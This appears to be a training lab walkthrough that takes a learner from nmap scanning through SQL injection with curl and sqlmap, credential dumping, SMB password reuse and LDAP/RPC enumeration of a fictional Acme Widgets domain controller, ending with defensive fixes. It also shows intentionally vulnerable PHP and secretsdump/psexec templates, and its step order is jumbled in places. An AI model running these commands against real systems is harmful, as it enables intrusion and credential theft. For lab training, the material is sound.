            ## Your Mission

            You are a penetration tester hired to assess **Acme Widgets'** security. Your goal: gain Domain Admin access starting from outside the network.

            ### Network Architecture

            ```
            INTERNET (172.16.0.0/24)
            ├── kali (172.16.0.10)        ← You are here
            └── wordpress (172.16.0.100)  ← Your initial target

            DMZ (172.16.1.0/24)
            └── wordpress (172.16.1.10)   ← Same server, internal IP

            INTERNAL (172.16.2.0/24)
            ├── fileserver (172.16.2.10)  ← SMB File Server
            ├── ws01 (172.16.2.11)        ← Employee Workstation
            └── dc01 (172.16.2.12)        ← Domain Controller
            ```

            ### First Steps

            Open a terminal and check your IP address:

            ```bash
            ip addr show eth0
            ```

            > You should see `172.16.0.10` - you're on the "internet" network.

            ## Discover Live Hosts

            Let's find what hosts are reachable from our position.

            ```bash
            # Ping sweep - find live hosts
            nmap -sn 172.16.0.0/24
            ```

            **What `-sn` does:** Host discovery only, no port scan. Fast and stealthy.

            ### Expected Results

            You should find:
            - `172.16.0.1` - Gateway
            - `172.16.0.10` - Your Kali box
            - `172.16.0.100` - **WordPress server** (your target!)

          title: "Service Enumeration"
          content: |
            ## Enumerate the Target

            Now scan the WordPress server for open ports and services:

            ```bash
            nmap -sV -sC 172.16.0.100
            ```

            **Flags explained:**
            - `-sV` - Detect service versions
            - `-sC` - Run default NSE scripts

            ### Expected Results

            | Port | Service | Notes |
            |------|---------|-------|
            | 22 | SSH | OpenSSH server |
            | 80 | HTTP | Apache web server |

            > **Next:** Let's explore that web application!

            ## Web Application Reconnaissance

            Open Firefox and browse to the target:

            ```
            http://172.16.0.100
            ```

            Or use curl:
            ```bash
            curl -s http://172.16.0.100 | head -50
            ```

            ### What to Look For

            - Technology stack (WordPress, custom app?)
            - Login forms and search boxes
            - Links to other pages

            > **Hint:** Look for an **Employee Directory** page!

        - id: step2_2
          vm: kali
          title: "Find the Vulnerable Page"
          content: |
            ## Directory Discovery

            Let's find hidden pages using gobuster:

            ```bash
            gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
            ```

            ### Expected Output

            You should see several results including:

            ```
            /wp-admin             (Status: 301)
            /wp-content           (Status: 301)
            /wp-includes          (Status: 301)
            /employees            (Status: 301)  ← This looks interesting!
            ```

            ### Investigate the Finding

            Navigate to the discovered `/employees/` page:

            ```
            http://172.16.0.100/employees/
            ```

            ### What Do You See?

            - A table of employees with names, departments, and contact info
            - A **search box** - user input is always interesting for attackers!
            - **Clickable employee names** - click on "John Smith" and notice the URL changes

            When you click an employee, the URL becomes:
            ```
            http://172.16.0.100/employees/?employee_id=1
            ```

            This `employee_id` parameter is user-controllable input - a potential injection point!

        - id: step_sqli_intro
          title: "Understanding SQL Injection"
          content: |
            ## What is SQL Injection?

            SQL Injection (SQLi) occurs when user input is inserted directly into a SQL query without proper sanitization. This allows attackers to manipulate the query's logic and access or modify data they shouldn't be able to reach.

            ### How Does It Work?

            Imagine a web application that looks up employee details with code like this:

            ```php
            // VULNERABLE CODE - Never do this!
            $query = "SELECT * FROM employees WHERE id = " . $_GET['employee_id'];
            ```

            When you visit `?employee_id=1`, the query becomes:
            ```sql
            SELECT * FROM employees WHERE id = 1
            ```

            But what if you visit `?employee_id=1 OR 1=1`? The query becomes:
            ```sql
            SELECT * FROM employees WHERE id = 1 OR 1=1
            ```

            Since `1=1` is always true, this returns ALL employees instead of just one!

            ### Why Is This Dangerous?

            With SQL injection, attackers can:
            - **Read sensitive data** - Extract usernames, passwords, credit cards
            - **Bypass authentication** - Log in without valid credentials
            - **Modify data** - Change prices, delete records, add admin accounts
            - **Execute system commands** - On some databases, run OS commands

            ### Boolean-Based Testing

            The simplest way to test for SQLi is with boolean conditions:
            - `AND 1=1` - Always TRUE, query should work normally
            - `AND 1=2` - Always FALSE, query should return nothing

            If the page behaves differently between these two, the input is being executed as SQL!

        - id: step2_3
          vm: kali
          title: "Test for SQL Injection"
          content: |
            ## Testing for SQL Injection

            The page has two potential injection points:
            1. The `search` parameter (search box)
            2. The `employee_id` parameter (employee detail links)

            Click on an employee name to see their details. Notice the URL changes to include `employee_id=1`.

            ### Testing the employee_id Parameter

            This numeric field is easier to exploit. We'll extract the employee's notes field to see the difference:

            ```bash
            # Normal request - should show employee notes
            curl -s "http://172.16.0.100/employees/?employee_id=1" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
            ```

            **Expected output:** `IT admin, has server access`

            Now test with boolean SQL injection:

            ```bash
            # Boolean true (1=1) - should still show notes (spaces URL-encoded as %20)
            curl -s "http://172.16.0.100/employees/?employee_id=1%20AND%201=1" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
            ```

            **Expected output:** `IT admin, has server access` (same as before)

            ```bash
            # Boolean false (1=2) - should return NOTHING
            curl -s "http://172.16.0.100/employees/?employee_id=1%20AND%201=2" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
            ```

            **Expected output:** (empty - no output!)

            > **Different responses confirm SQL injection!** The injected SQL is being executed by the database.

            ## Automated Exploitation

            SQLMap automates SQL injection attacks. Let's use it!

            ### Step 1: Confirm the Vulnerability

            ```bash
            sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --batch
            ```

            `-p employee_id` tells SQLMap which parameter to test.

            ### Step 2: List Databases

            ```bash
            sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --dbs --batch
            ```

            ### Step 3: List Tables

            ```bash
            sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress --tables --batch
            ```

            > Look for: `wp_acme_employees`

        - id: step2_5
          vm: kali
          title: "Dump the Credentials!"
          content: |
            ## Extract Employee Data

            Now dump the employee table:

            ```bash
            sqlmap -u "http://172.16.0.100/employees/?employee_id=1" \
              -p employee_id -D wordpress -T wp_acme_employees --dump --batch
            ```

            ### CRITICAL FINDING

            The output reveals **VPN credentials in plaintext**:

            | Employee | Username | Password |
            |----------|----------|----------|
            | John Smith | jsmith | Summer2024 |
            | Mary Williams | mwilliams | Welcome123 |
            | **Backup Service** | **svc_backup** | **Backup2024** |

            > **The service account is your ticket to the internal network!**

          vm: kali
          title: "Test Credential Reuse"
          content: |
            ## The Credential Reuse Attack

            Employees and services often reuse passwords across systems. Let's test if `svc_backup` credentials from the WordPress database also work on the internal file server.

            ### Understanding Credential Reuse

            This is one of the most common attack vectors:
            1. Attacker compromises one system (WordPress database)
            2. Extracts credentials (svc_backup / Backup2024)
            3. Tests those credentials on other systems
            4. Gains access to additional resources

            ### Method 1: Using Impacket (Recommended)

            Impacket is a powerful Python toolkit commonly used in penetration testing:

            ```bash
            impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
            ```

            Once connected, list available shares:
            ```
            # shares
            ```

            ### Method 2: Using Standard smbclient

            Alternatively, use the standard Linux SMB client:

            ```bash
            # List shares
            smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'
            ```

            ### Expected Shares

            | Share | Description |
            |-------|-------------|
            | public | Open to everyone |
            | **sensitive** | Restricted - but svc_backup has access! |
            | accounting | Financial documents |
            | IPC$ | Inter-process communication |

            > **The credentials work!** This confirms password reuse between systems.

            Now that we have domain admin credentials, let's explore the Active Directory structure.

            **List domain users with ldapsearch:**

            ```bash
            LDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \
              -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
              -w 'Adm1n2024' \
              -b 'cn=Users,DC=acmewidgets,DC=local' \
              '(objectClass=user)' sAMAccountName
            ```

            > **Note:** `LDAPTLS_REQCERT=never` is needed because the domain controller uses a self-signed certificate. The `-ZZ` flag enables StartTLS encryption which Samba AD requires.

            **Alternative: Use rpcclient to enumerate users:**

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c enumdomusers
            ```

            This shows all domain user accounts including service accounts like `svc_backup` that may have elevated privileges.

            ## Critical Discovery!

            The `passwords.txt` file reveals emergency credentials:

            ```
            === ACME INTERNAL PASSWORD LIST ===
            DO NOT SHARE OUTSIDE IT DEPARTMENT

            Server Room Door: 4521
            WiFi Password: AcmeGuest2024
            VPN PSK: AcmeVPN2024
            Backup Encryption: BackupKey2024!

            Domain Admin (emergency): Adm1n2024
            ```

            ### What You've Found

            | Account | Password | Access Level |
            |---------|----------|--------------|
            | Administrator | Adm1n2024 | **DOMAIN ADMIN** |

            ### Why This Matters

            - **Plaintext passwords** stored on a file share (terrible practice!)
            - **Domain Admin credentials** give you complete control of the network
            - This is a common finding in real penetration tests

            > **You now have the keys to the kingdom!**

            Next, we'll verify these credentials work on the Domain Controller.

            ### About This Lab Environment

            This lab uses **Samba 4 AD** (Linux-based) instead of Windows Server. This is common in:
            - ARM-based environments (M1/M2 Macs, ARM servers)
            - Cost-conscious deployments
            - Linux-centric organizations

            ### Windows vs Samba: What's Different?

            | Attack | Windows AD | Samba AD |
            |--------|-----------|----------|
            | DCSync (secretsdump) | ✅ Works | ❌ Not supported |
            | PSExec/WMIExec | ✅ Works | ❌ No Windows services |
            | SMB Share Access | ✅ Works | ✅ Works |
            | LDAP Enumeration | ✅ Works | ✅ Works |
            | RPC Enumeration | ✅ Works | ✅ Works |

            > **Real-world note:** In Windows AD environments, you'd use `impacket-secretsdump` for DCSync to extract all password hashes. That attack isn't available here, but the enumeration skills transfer directly.

            ## Enumerate the Domain

            With Domain Admin credentials, let's map out the entire domain.

            ### List All Domain Users

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers'
            ```

            ### Get Detailed User Information

            ```bash
            # Get info about a specific user (500 = Administrator RID)
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser 500'
            ```

            ### Enumerate Domain Groups

            ```bash
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomgroups'
            ```

            ### List Domain Admins Group Members

            ```bash
            # Group RID 512 = Domain Admins
            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'querygroupmem 512'
            ```

            > **What you're learning:** These enumeration techniques work on both Windows and Samba AD. This is how attackers map out an organization after gaining initial access.

            ## Verify Full Domain Control

            The ultimate proof of domain compromise is accessing protected resources.

            ### Access SYSVOL (Domain Admin Required)

            SYSVOL contains Group Policy objects and is only writable by Domain Admins:

            ```bash
            smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
            ```

            ### Access All Shares on DC

            ```bash
            smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'
            ```

            ### Access File Server with Domain Admin

            Domain Admin credentials work across all domain-joined systems:

            ```bash
            smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024' -c 'ls'
            ```

            ### What This Means

            With Domain Admin access, an attacker can:
            - **Read/write any file** on domain-joined systems
            - **Create new admin accounts** for persistence
            - **Deploy malware** via Group Policy
            - **Access all user data** across the organization

            > **You now have complete domain control!**

            ### In a Windows Environment

            With Windows AD, you would also:
            ```bash
            # DCSync - extract all password hashes
            impacket-secretsdump 'DOMAIN/Administrator:Password@DC_IP'

            # Remote code execution
            impacket-psexec 'Administrator:Password@TARGET_IP'
            impacket-wmiexec 'Administrator:Password@TARGET_IP'
            ```

            ## LDAP Enumeration

            Beyond RPC, LDAP gives you detailed directory information. This is valuable for mapping the organization structure.

            ### List All Domain Users via LDAP

            ```bash
            ldapsearch -x -H ldap://172.16.2.12 \
              -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
              -w 'Adm1n2024' \
              -b 'cn=Users,DC=acmewidgets,DC=local' \
              '(objectClass=user)' sAMAccountName description
            ```

            ### Find Service Accounts

            Service accounts often have elevated privileges:

            ```bash
            ldapsearch -x -H ldap://172.16.2.12 \
              -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
              -w 'Adm1n2024' \
              -b 'DC=acmewidgets,DC=local' \
              '(description=*service*)' sAMAccountName description
            ```

            ### Check Domain Admin Group Members

            ```bash
            ldapsearch -x -H ldap://172.16.2.12 \
              -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
              -w 'Adm1n2024' \
              -b 'DC=acmewidgets,DC=local' \
              '(cn=Domain Admins)' member
            ```

            > **Pro tip:** In real engagements, you'd export this data and analyze it offline to find attack paths, service accounts, and high-value targets.

            ## Defensive Lessons

            | Vulnerability | Fix |
            |--------------|-----|
            | SQL Injection | Parameterized queries |
            | Plaintext passwords | Use a secrets manager |
            | Password reuse | Unique passwords + MFA |
            | Sensitive files on share | Proper access controls |
            | Excessive service account rights | Least privilege |
